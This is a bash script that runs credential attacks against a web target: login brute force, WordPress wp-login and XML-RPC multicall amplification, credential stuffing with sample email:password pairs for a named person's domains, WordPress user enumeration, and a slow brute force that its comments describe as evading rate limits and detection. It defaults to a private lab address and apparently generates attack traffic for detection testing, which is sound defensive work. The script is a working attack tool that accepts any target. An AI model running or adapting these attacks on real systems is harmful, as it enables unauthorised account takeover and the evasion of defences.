#!/bin/bash
###############################################################################
# CREDENTIAL ATTACKS
# Mimics real-world login brute force and credential stuffing attacks
# Based on patterns observed on brianchaplow.com and bytesbourbonbbq.com
###############################################################################

set -e

ATTACK_TYPE="${1:-web_login}"
TARGET="${2:-10.10.40.10}"
PORT="${3:-80}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(dirname "$0")"
WORDLIST_DIR="${SCRIPT_DIR}/../wordlists"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $1"; }
warn() { echo -e "${YELLOW}[$(date '+%H:%M:%S')]${NC} $1"; }

###############################################################################
# WEB LOGIN BRUTE FORCE (DVWA style)
###############################################################################
web_login_brute() {
    log "Starting web login brute force..."
    
    USERS_FILE="${WORDLIST_DIR}/wordpress_users.txt"
    PASS_FILE="${WORDLIST_DIR}/domain_specific_passwords.txt"
    
    if [[ ! -f "$USERS_FILE" ]]; then
        warn "Users file not found, using defaults"
        USERS="admin brian administrator root"
    else
        USERS=$(cat "$USERS_FILE")
    fi
    
    if [[ ! -f "$PASS_FILE" ]]; then
        warn "Password file not found, using defaults"
        PASSWORDS="password admin123 letmein"
    else
        PASSWORDS=$(cat "$PASS_FILE")
    fi
    
    # DVWA login endpoint
    for user in $USERS; do
        for pass in $PASSWORDS; do
            curl -s -X POST "http://${TARGET}:${PORT}/login.php" \
                -d "username=${user}&password=${pass}&Login=Login" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Referer: http://${TARGET}:${PORT}/login.php" \
                -o /dev/null &
            
            # Rate limit to generate realistic traffic
            sleep 0.05
        done
    done
    
    wait
    log "Web login brute force complete"
}

###############################################################################
# WORDPRESS LOGIN SIMULATION
# Mimics wp-login.php attacks even though DVWA doesn't have WordPress
###############################################################################
wordpress_login_sim() {
    log "Starting WordPress login simulation..."
    
    USERS_FILE="${WORDLIST_DIR}/wordpress_users.txt"
    PASS_FILE="${WORDLIST_DIR}/domain_specific_passwords.txt"
    
    USERS=$(cat "$USERS_FILE" 2>/dev/null || echo "admin brian administrator")
    PASSWORDS=$(cat "$PASS_FILE" 2>/dev/null || echo "password admin123")
    
    # Simulate WordPress login attempts (will 404 but generate traffic pattern)
    for user in $USERS; do
        for pass in $PASSWORDS; do
            # Standard wp-login.php POST
            curl -s -X POST "http://${TARGET}:${PORT}/wp-login.php" \
                -d "log=${user}&pwd=${pass}&wp-submit=Log+In&redirect_to=http%3A%2F%2F${TARGET}%2Fwp-admin%2F&testcookie=1" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
                -o /dev/null &
            
            sleep 0.03
        done
    done
    
    wait
    log "WordPress login simulation complete"
}

###############################################################################
# XML-RPC MULTICALL ATTACK
# Amplified brute force via wp.getUsersBlogs
###############################################################################
xmlrpc_attack() {
    log "Starting XML-RPC multicall attack..."
    
    PASSWORDS=$(cat "${WORDLIST_DIR}/domain_specific_passwords.txt" 2>/dev/null | head -20 || echo "password admin123")
    
    for pass in $PASSWORDS; do
        # Build XML-RPC multicall payload
        PAYLOAD="<?xml version=\"1.0\"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>${pass}</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>brian</string></value>
<value><string>${pass}</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>administrator</string></value>
<value><string>${pass}</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>"

        curl -s -X POST "http://${TARGET}:${PORT}/xmlrpc.php" \
            -H "Content-Type: application/xml" \
            -H "User-Agent: WordPress/6.4" \
            -d "$PAYLOAD" \
            -o /dev/null &
        
        sleep 0.1
    done
    
    wait
    log "XML-RPC multicall attack complete"
}

###############################################################################
# CREDENTIAL STUFFING (Leaked Credentials Style)
###############################################################################
credential_stuffing() {
    log "Starting credential stuffing attack..."
    
    # Simulate leaked credential format (email:password)
    CREDENTIALS=(
        "admin@brianchaplow.com:password123"
        "brian@brianchaplow.com:brianchaplow2024"
        "contact@brianchaplow.com:contact123"
        "info@brianchaplow.com:info2024!"
        "test@gmail.com:test123"
        "user@yahoo.com:password1"
        "admin@example.com:admin123"
        "support@brianchaplow.com:support!"
        "brian.chaplow@gmail.com:BrianChaplow1"
        "bchaplow@hotmail.com:bchaplow123"
    )
    
    for cred in "${CREDENTIALS[@]}"; do
        email="${cred%%:*}"
        pass="${cred#*:}"
        
        # Try as username
        user="${email%%@*}"
        
        curl -s -X POST "http://${TARGET}:${PORT}/login.php" \
            -d "username=${user}&password=${pass}&Login=Login" \
            -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
            -o /dev/null &
        
        # Also try with full email
        curl -s -X POST "http://${TARGET}:${PORT}/login.php" \
            -d "username=${email}&password=${pass}&Login=Login" \
            -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)" \
            -o /dev/null &
        
        sleep 0.05
    done
    
    wait
    log "Credential stuffing complete"
}

###############################################################################
# USER ENUMERATION
###############################################################################
user_enumeration() {
    log "Starting user enumeration..."
    
    # WordPress author enumeration
    for i in {1..50}; do
        curl -s "http://${TARGET}:${PORT}/?author=${i}" \
            -H "User-Agent: Mozilla/5.0" \
            -o /dev/null &
        sleep 0.02
    done
    
    # WP REST API user endpoint
    curl -s "http://${TARGET}:${PORT}/wp-json/wp/v2/users" \
        -H "User-Agent: Mozilla/5.0" \
        -o /dev/null &
    
    # oEmbed endpoint
    curl -s "http://${TARGET}:${PORT}/wp-json/oembed/1.0/embed?url=http://${TARGET}/" \
        -o /dev/null &
    
    # Login error enumeration
    USERNAMES="admin administrator brian root webmaster user test guest www web"
    for user in $USERNAMES; do
        curl -s -X POST "http://${TARGET}:${PORT}/login.php" \
            -d "username=${user}&password=wrongpassword&Login=Login" \
            -H "User-Agent: WPScan v3.8.22" \
            -o /dev/null &
        sleep 0.02
    done
    
    wait
    log "User enumeration complete"
}

###############################################################################
# SLOW BRUTE FORCE (Evade Rate Limiting)
###############################################################################
slow_brute() {
    log "Starting slow brute force (rate limit evasion)..."
    
    USERS="admin brian"
    PASSWORDS="password password1 password123 admin admin123 letmein welcome"
    
    for user in $USERS; do
        for pass in $PASSWORDS; do
            curl -s -X POST "http://${TARGET}:${PORT}/login.php" \
                -d "username=${user}&password=${pass}&Login=Login" \
                -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
                -o /dev/null
            
            # Slow delay to evade detection
            sleep 3
        done
    done
    
    log "Slow brute force complete"
}

###############################################################################
# MAIN
###############################################################################
case "$ATTACK_TYPE" in
    web_login|login)
        web_login_brute
        ;;
    wordpress|wp)
        wordpress_login_sim
        ;;
    xmlrpc)
        xmlrpc_attack
        ;;
    stuffing|credential_stuffing)
        credential_stuffing
        ;;
    enum|enumeration)
        user_enumeration
        ;;
    slow)
        slow_brute
        ;;
    full)
        user_enumeration
        web_login_brute
        wordpress_login_sim
        xmlrpc_attack
        credential_stuffing
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        echo "Available: web_login, wordpress, xmlrpc, stuffing, enum, slow, full"
        exit 1
        ;;
esac
